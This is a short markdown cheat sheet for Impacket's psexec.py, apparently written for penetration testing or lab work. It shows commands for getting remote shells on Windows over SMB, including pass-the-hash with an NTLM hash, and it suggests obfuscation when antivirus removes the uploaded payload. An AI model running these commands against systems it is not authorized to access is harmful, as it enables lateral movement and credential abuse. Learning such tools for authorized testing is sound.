
# 🛠️ Impacket `psexec.py` Usage Guide

The `psexec.py` tool from the Impacket suite allows remote command execution on Windows systems using SMB and the Service Control Manager.

---

## ✅ Basic Usage

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@<target_ip>
```

You’ll be prompted for the password.

---

## 🔐 Authenticate with NTLM Hash

```bash
python3 psexec.py -hashes <LMHASH>:<NTHASH> Administrator@<target_ip>
```

Example:
```bash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9a5b8e5f6ed... Administrator@10.129.237.20
```

---

## 🧪 Run a Specific Command

```bash
python3 psexec.py Administrator@<target_ip> -command "ipconfig /all"
```

---

## 🗝️ Use a Password File

```bash
python3 psexec.py -auth-file auth.txt Administrator@<target_ip>
```

---

## 📁 Common Output Indicators

- `[*] Uploading file <random>.exe`: Impacket uploads a temporary payload
- `[*] Starting service <svcname>`: Command is being run as a service
- `Microsoft Windows [Version ...]`: You've got a shell!

---

## ⚠️ Troubleshooting

| Issue                              | Fix                                                      |
|-----------------------------------|-----------------------------------------------------------|
| `STATUS_LOGON_FAILURE`            | Check username/password or NT hash                        |
| `Connection refused`              | SMB port (445) may be blocked                             |
| `Access denied` after auth        | Admin rights required                                     |
| Antivirus deletes the uploaded EXE| AV is interfering; try obfuscation or another technique   |

---

## 📦 Related Tools

- `wmiexec.py`: Lighter-weight, no file upload
- `smbexec.py`: Uses SMB pipes for execution
- `evil-winrm`: Native PowerShell shell access over WinRM

---

## 🧼 Clean Up

Be sure to:
- Remove any dropped payloads
- Stop created services
- Log out cleanly

---

✅ Use `psexec.py` when you have valid admin credentials or hashes and need full shell access to a remote Windows system.
